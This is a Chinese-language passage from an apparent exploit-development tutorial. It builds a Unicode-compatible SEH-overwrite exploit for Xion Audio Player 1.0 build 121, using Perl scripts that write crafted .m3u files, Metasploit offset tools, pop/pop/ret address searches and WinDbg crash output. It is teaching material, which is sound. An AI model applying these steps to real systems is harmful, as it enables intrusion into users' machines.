### 优化后的文本

#### 汇编代码示例
```assembly
0012f2bc: 0500140011 add eax, offset XXXX+0x1400 (11001400)
0012f2c1: 006e00 add byte ptr [esi], ch
0012f2c4: 2d00110011 sub eax, offset XXXX+0x1100 (11001100)
0012f2c9: 006e00 add byte ptr [esi], ch
```

#### 成功信息
成功了！

#### 编写可行的exploit
现在，我们将这些步骤组合起来以编写一个可行的exploit：
1. 在EIP中放置一些有用的地址。
2. 根据需要调整寄存器。
3. 跳转并运行shellcode（ASCII或通过解码器）。

#### 示例：Unicode兼容的exploit
为了演示如何编写一个可用的Unicode兼容的exploit，我们将引用由DragOn Rider在2009年10月8日发现的Xion Audio Player v1.0 (build 121)漏洞。由于原始PoC代码中的链接已失效，以下是漏洞软件的下载链接：
- Xion Audio Player 1.0 build 121 (2.7 MB, 151 downloads): [下载链接](http://www.corelan.be:8800/?dl_id=42)
- 新版本下载链接: [下载链接](http://www.r2.com.au/downloads/files/beta/qa-xion_v1.0b124.exe)

#### PoC代码
该PoC代码由DragOn Rider编写，用于构造一个播放列表文件（.m3u），导致程序崩溃。测试环境为Windows XP SP3 English（全补丁），运行在VirtualBox中，区域设置为English (US)。PoC代码如下：

```perl
my $crash = "\x41" x 5000;
open(myfile, '>', 'DragonR.m3u');
print myfile $crash;
close(myfile);
```

#### 测试步骤
1. 打开程序（在WinDbg或其他调试器中打开）。
2. 在界面上右击，选择“Playlist”，然后选择“File” -> “Load Playlist”。
3. 选择生成的m3u文件，观察效果。

#### 调试信息
```plaintext
(e54.a28): Access violation - code c0000005 (first chance)
eax=00000041 ebx=019ca7ec ecx=02db3e60 edx=00130000 esi=019ca7d0 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx], ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
image00400000+10041 (00410041)
Invalid exception stack at 00410041
SEH结构现在被覆盖为00410041(AA转换为unicode后的结果)。
```

#### SEH覆盖
在ASCII情况下，SEH Handler需要用pop pop ret地址覆盖，而short jump地址覆盖next SEH。为此，我们需要完成以下三步：
1. 找出SEH结构的偏移量。
2. 找出兼容Unicode的pop pop ret地址。
3. 找出可用于跳转的地址。

#### 计算偏移量
使用Metasploit的`pattern_create`生成5000字符的模式，并替换$crash变量中的5000个A。结果如下：

```plaintext
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0000006e ebx=02e45e6c ecx=02db7708 edx=00130000 esi=02e45e50 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx], ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
0012f2ac: BASS_FX+69 (00350069)
Invalid exception stack at 00410034
0:000> d 0012f2ac
0012f2ac 34 00 41 00 69 00 35 00-41 00 69 00 36 00 41 00 4.A.i.5.A.i.6.A.
...
```

用`d 0012f2ac`命令查看SEH结构，可以看到next SEH被覆盖为`34 00 41 00`，而SEH Handler被覆盖为`69 00 35 00`。计算偏移量：

```bash
xxxx@bt4 ~/framework3/tools
$ ./pattern_offset.rb 0x35694134 5000
254
```

#### 构造脚本
此时脚本应如下构造：

```perl
my $totalsize = 5000;
my $junk = "A" x 254;
my $nseh = "BB";
my $seh = "CC";
my $morestuff = "D" x (5000 - length($junk . $nseh . $seh));
$payload = $junk . $nseh . $seh . $morestuff;
open(myfile, '>', 'corelantest.m3u');
print myfile $payload;
close(myfile);
print "Wrote " . length($payload) . " bytes\n";
```

#### 结果
```plaintext
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000044 ebx=019c4e54 ecx=02db3710 edx=00130000 esi=019c4e38 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx], ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
0012f2ac:
image00400000+30043 (00430043)
Invalid exception stack at 00420042
0:000> d 0012f2ac
0012f2ac 42 00 42 00 43 00 43 00-44 00 44 00 44 00 44 00 B.B.C.C.D.D.D.D.
...
```

#### 寻找pop pop ret地址
使用ImmDbg插件`pvefindaddr`搜索整个进程内存空间中匹配的pop/pop/ret地址，并将结果输出到`ppr2.txt`文件中。

```bash
C:\Program Files\Immunity Inc\Immunity Debugger>type ppr2.txt | findstr Unicode
ret at 0x00470BB5 [xion.exe] ** Maybe Unicode compatible **
ret at 0x0047073F [xion.exe] ** Maybe Unicode compatible **
ret at 0x004107D2 [xion.exe] ** Maybe Unicode compatible **
ret at 0x004107FE [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480A93 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00450015 [xion.exe] ** Unicode compatible **
ret at 0x0045048B [xion.exe] ** Maybe Unicode compatible **
ret at 0x0047080C [xion.exe] ** Maybe Unicode compatible **
...
```

#### 测试地址
使用找到的地址覆盖SE Handler，并用`0x41 0x41`覆盖next SEH。

```perl
my $totalsize = 5000;
my $junk = "A" x 254;
my $nseh = "\x41\x41"; # nseh -> 00410041
my $seh = "\x15\x45"; # put 00450015 in SE Handler
my $morestuff = "D" x (5000 - length($junk . $nseh . $seh));
$payload = $junk . $nseh . $seh . $morestuff;
open(myfile, '>', 'corelantest.m3u');
print myfile $payload;
close(myfile);
print "Wrote " . length($payload) . " bytes\n";
```

#### 调试结果
```plaintext
0:000> !exchain
0012f2ac:
image00400000+50015 (00450015)
Invalid exception stack at 00410041
0:000> bp 00450015
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450015 esp=0012e47c ebp=0012e49c iopl=0 nv up ei pl zr na pe nc
```